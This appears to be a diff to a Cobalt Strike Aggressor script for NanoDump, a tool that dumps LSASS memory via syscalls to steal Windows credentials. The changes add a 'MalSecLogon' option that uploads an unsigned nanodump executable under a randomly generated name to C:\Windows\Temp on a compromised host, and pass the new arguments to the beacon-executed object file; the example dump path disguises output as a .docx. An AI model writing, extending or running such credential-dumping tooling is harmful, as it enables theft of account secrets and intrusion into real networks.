@@ -1,10 +1,26 @@
 
+
+sub generate_rand_string {
+local('@dictionary $string $min_length $max_length $length');
+    @dictionary = @("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
+    $min_length = $1;
+    $max_length = $2;
+    $length =  $min_length + rand($max_length - $min_length);
+    $string = "";
+    while ($length != 0)
+    {
+        $string = $string . rand(@dictionary);
+        $length--;
+    }
+    return $string;
+}
+
 beacon_command_register(
 "nanodump",
 "Use syscalls to dump LSASS.",
-"Usage: nanodump [--pid 1234] [--valid] [--write C:\\Windows\\Temp\\doc.docx] [--fork] [--dup] [--getpid]");
+"Usage: nanodump [--pid 1234] [--valid] [--write C:\\Windows\\Temp\\doc.docx] [--fork] [--dup] [--getpid] [--seclogon]");
 alias nanodump {
-    local('$barch $handle $data $args $pid $cname $dump_name $write_file $use_valid_sig $fork $dup $i $get_pid');
+    local('$barch $handle $bof $exe $args $pid $cname $dump_name $write_file $use_valid_sig $fork $dup $i $get_pid $use_seclogon $folder $nanodump_binary');
 
     $barch = barch($1);
     if($barch eq "x86")
@@ -31,14 +47,16 @@ alias nanodump {
 
     # read in the BOF file
     $handle = openf(script_resource("compiled/nanodump." . $barch . ".o"));
-    $data = readb($handle, -1);
+    $bof = readb($handle, -1);
     closef($handle);
-    if(strlen($data) == 0)
+    if(strlen($bof) == 0)
     {
         berror($1, "could not read bof file");
         return;
     }
 
+    # by default, do not use MalSecLogon
+    $use_seclogon = 0;
     # by default, do not get the PID of LSASS
     $get_pid = 0;
     # by default, nanodump will find the PID of LSASS dinamically
@@ -57,7 +75,12 @@ alias nanodump {
     $use_valid_sig = 0;
     for ($i = 1; $i < size(@_); $i++)
     {
-        if (@_[$i] eq "--pid" || @_[$i] eq "-p")
+        if (@_[$i] eq "--seclogon" || @_[$i] eq "-sl")
+        {
+            # use MalSecLogon
+            $use_seclogon = 1;
+        }
+        else if (@_[$i] eq "--pid" || @_[$i] eq "-p")
         {
             # set the PID of LSASS
             $i++;
@@ -118,6 +141,38 @@ alias nanodump {
         return;
     }
 
+    if($use_seclogon && $pid == 0)
+    {
+        berror($1, "The option --seclogon requires a PID. Run with --getpid first.");
+        return;
+    }
+
+    if($use_seclogon && $write_file == 0)
+    {
+        berror($1, "The option --seclogon requires a dump path.");
+        return;
+    }
+
+    $nanodump_binary = "";
+    if($use_seclogon)
+    {
+        blog($1, "[!] MalLogonSec implementation is unstable, errors are to be expected");
+        $folder = "C:\\Windows\\Temp";
+        $nanodump_binary = $folder . "\\" .  generate_rand_string(5, 10) . ".exe";
+        blog($1, "[!] An unsigned nanodump binary will be uploaded to: ". $nanodump_binary);
+        # read in the EXE file
+        $handle = openf(script_resource("compiled/nanodump." . $barch . ".exe"));
+        $exe = readb($handle, -1);
+        closef($handle);
+        if(strlen($exe) == 0)
+        {
+            berror($1, "could not read exe file");
+            return;
+        }
+        # upload the nanodump binary
+        bupload_raw($1, $nanodump_binary, $exe);
+    }
+
     # check if --fork was enabled with no PID
     if($fork == 1 && $pid == 0)
     {
@@ -133,9 +188,9 @@ alias nanodump {
     }
 
     # pack the arguments
-    $args = bof_pack($1, "iziiiii", $pid, $dump_name, $write_file, $use_valid_sig, $fork, $dup, $get_pid);
+    $args = bof_pack($1, "iziiiiiiz", $pid, $dump_name, $write_file, $use_valid_sig, $fork, $dup, $get_pid, $use_seclogon, $nanodump_binary);
 
     # run
     btask($1, "Running NanoDump BOF");
-    beacon_inline_execute($1, $data, "go", $args);
+    beacon_inline_execute($1, $bof, "go", $args);
 }
